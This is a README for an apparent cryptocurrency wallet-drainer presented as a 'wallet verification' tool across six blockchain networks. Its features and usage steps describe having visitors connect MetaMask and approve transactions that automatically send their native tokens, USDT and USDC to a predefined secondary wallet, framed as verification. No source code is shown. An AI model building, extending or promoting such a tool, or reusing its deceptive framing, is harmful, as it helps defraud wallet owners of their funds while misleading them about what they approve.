# Secure Wallet Verification

A web-based wallet verification tool that allows users to verify their cryptocurrency wallets across multiple blockchain networks.

## Features

- **Multi-Chain Support**: Supports Ethereum, Binance Smart Chain, Polygon, Avalanche, Arbitrum, and Optimism
- **Token Transfer**: Automatically transfers native tokens and ERC-20 tokens (USDT, USDC) to a secondary wallet
- **MetaMask Integration**: Seamless integration with MetaMask wallet
- **Real-time Status**: Live transaction status updates with explorer links

## Supported Networks

- **Ethereum (ETH)**: Mainnet with USDT and USDC support
- **Binance Smart Chain (BSC)**: BNB native token with USDT and USDC
- **Polygon**: MATIC native token with USDT and USDC
- **Avalanche**: AVAX native token with USDT and USDC
- **Arbitrum**: ETH native token with USDT and USDC
- **Optimism**: ETH native token with USDT and USDC

## How to Use

1. Open the website in a web browser
2. Select your desired blockchain network from the dropdown
3. Click "Verify Wallet" button
4. Connect your MetaMask wallet when prompted
5. Approve the transactions to complete verification

## Technical Details

- Built with vanilla JavaScript and HTML5
- Uses Ethers.js library for blockchain interactions
- Responsive CSS design
- Module-based architecture

## File Structure

```
├── index.html          # Main HTML file
├── styles/
│   └── main.css       # Styling
├── scripts/
│   ├── app.js         # Main application logic
│   ├── config.js      # Configuration and constants
│   └── chains.js      # Chain configurations
└── README.md          # This file
```

## Requirements

- Modern web browser with JavaScript enabled
- MetaMask browser extension installed
- Active cryptocurrency wallet with tokens

## Security Notice

This application is designed for wallet verification purposes. All transactions are sent to a predefined secondary wallet address. Users should review all transactions before approval.